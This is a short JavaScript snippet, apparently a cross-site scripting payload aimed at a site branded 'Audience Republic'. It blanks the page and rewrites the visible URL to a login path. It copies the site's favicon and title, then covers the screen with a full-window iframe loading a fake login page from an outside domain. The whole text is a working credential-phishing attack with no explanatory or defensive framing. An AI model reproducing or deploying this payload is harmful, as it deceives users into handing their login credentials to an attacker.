document.body.style='color: white';
document.body.innerHTML = '<div></div>';
history.replaceState(history.state, '', '/authenticate/login');
var link = document.querySelector("link[rel~='icon']");
if (!link) {
    link = document.createElement('link');
    link.rel = 'icon';
    document.head.appendChild(link);
}
link.href = 'https://cdn.arep.co/img/favicon/favicon.ico';
document.title = "Audience Republic"
document.body.innerHTML='<iframe frameBorder=0 style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;" src="https://aguzik.net/ar-login.html"/>'
